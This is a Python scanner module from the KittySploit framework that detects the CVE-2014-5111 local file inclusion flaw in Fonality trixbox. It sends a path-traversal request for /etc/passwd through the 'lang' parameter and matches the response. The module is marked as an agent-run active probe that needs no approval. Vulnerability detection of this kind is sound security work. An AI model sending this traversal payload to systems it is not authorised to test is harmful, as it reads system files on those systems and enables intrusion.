#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple local file inclusion vulnerabilities in Fonality trixbox allow remote attackers to read arbitrary fil."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fonality trixbox - Local File Inclusion Detection',
        'description': 'Multiple local file inclusion vulnerabilities in Fonality trixbox allow remote attackers to read arbitrary files via a .. (dot dot) in the lang parameter to (1) home/index.php, (2) asterisk_info/asterisk_info.php, (3) repo/repo.php, or (4) endpointcfg/endpointcfg.php in maint/modules/.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'packetstorm', 'lfi', 'trixbox', 'edb', 'netfortris', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39351',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5111',
            'http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-5111',
    }

    def run(self):
        r = self.http_request(method="GET", path='/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Fonality trixbox - Local File Inclusion detected",
                path='/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00',
            )
            return True
        return False

